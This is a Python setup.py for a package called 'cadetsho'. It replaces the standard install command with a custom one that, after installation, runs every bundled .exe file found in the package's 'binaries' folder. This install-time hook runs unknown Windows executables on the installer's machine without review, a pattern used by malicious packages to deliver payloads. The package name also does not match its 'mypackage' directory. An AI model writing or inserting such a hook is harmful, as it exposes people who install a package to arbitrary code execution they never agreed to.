from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import subprocess
from pathlib import Path

class CustomInstallCommand(install):
    """Custom installation to execute all EXE files after installing."""
    def run(self):
        install.run(self)  # Run default install steps
        
        # Find the path to the installed package
        install_path = Path(self.install_lib) / "mypackage" / "binaries"

        # Execute all EXE files
        if install_path.exists():
            for exe in install_path.glob("*.exe"):
                print(f"Running {exe} ...")
                try:
                    subprocess.run([str(exe)], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"Error running {exe}: {e}")

setup(
    name="cadetsho",
    version="0.1.0",
    packages=find_packages(),
    package_data={"mypackage": ["binaries/*.exe"]},  # Include all EXEs
    include_package_data=True,
    install_requires=[],
    cmdclass={"install": CustomInstallCommand},  # Run EXEs on install
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ],
)
